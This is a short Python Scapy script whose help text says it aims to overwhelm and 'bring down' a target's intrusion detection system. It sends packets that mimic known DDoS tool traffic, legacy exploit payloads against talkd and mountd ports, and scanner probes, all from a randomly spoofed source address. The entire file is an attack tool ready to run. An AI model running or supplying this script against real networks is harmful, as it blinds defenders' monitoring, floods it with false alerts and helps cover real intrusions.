import argparse
from scapy.all import *
from random import randint

def test_ddos(src, dst, iface, count):
    packet = IP(src=src, dst=dst)/ICMP(type=8, id=678)/Raw(load='1234')
    send(packet, iface=iface, count=count)
    packet = IP(src=src, dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
    send(packet, iface=iface, count=count)
    packet = IP(src=src, dst=dst)/UDP(dport=31335)/Raw(load='PONG')
    send(packet, iface=iface, count=count)
    packet = IP(src=src, dst=dst)/ICMP(type=0, id=456)
    send(packet, iface=iface, count=count)

def test_exploit(src, dst, iface, count):
    packet = IP(src=src, dst=dst) / UDP(dport=518) \
        /Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x02\xE8')
    send(packet, iface=iface, count=count)
    packet = IP(src=src, dst=dst) / UDP(dport=635) \
        /Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    send(packet, iface=iface, count=count)

def scan_test(src, dst, iface, count):
    packet = IP(src=src, dst=dst) / UDP(dport=7)\
        /Raw(load='cybercop')
    send(packet)
    packet = IP(src=src, dst=dst) / UDP(dport=10080)\
        /Raw(load='Amanda')
    send(packet, iface=iface, count=count)

def main():
    parser = argparse.ArgumentParser(
        description=u'A simple program to attempt to foil a IDS by sending multiple packets'
                    u'that hopefully will overflow the IDS.'
    )
    parser.add_argument(
        u'-i',
        help=u'The interface which you wish to send the packets from',
        dest=u'interface',
        required=False,
        default=u'eth0'
    )
    parser.add_argument(
        u'-s',
        help=u'The source address from which you wish the packets to come from',
        dest=u'src',
        default='.'.join([str(randint(1, 254)) for x in range(4)]),
        required=False
    )
    parser.add_argument(
        u'-t',
        help=u'The target of which has the IDS you wish to bring down',
        dest=u'target',
        required=True
    )
    parser.add_argument(
        u'-c',
        help=u'The amount of packets you wish to try to overwhelm the IDS with',
        dest=u'count',
        default=1
    )
    args = parser.parse_args()
    test_ddos(args.src, args.target,
              args.interface, args.count)
    test_exploit(args.src, args.target,
                 args.interface, args.count)
    scan_test(args.src, args.target,
              args.interface, args.count)

if __name__ == '__main__':
    main()
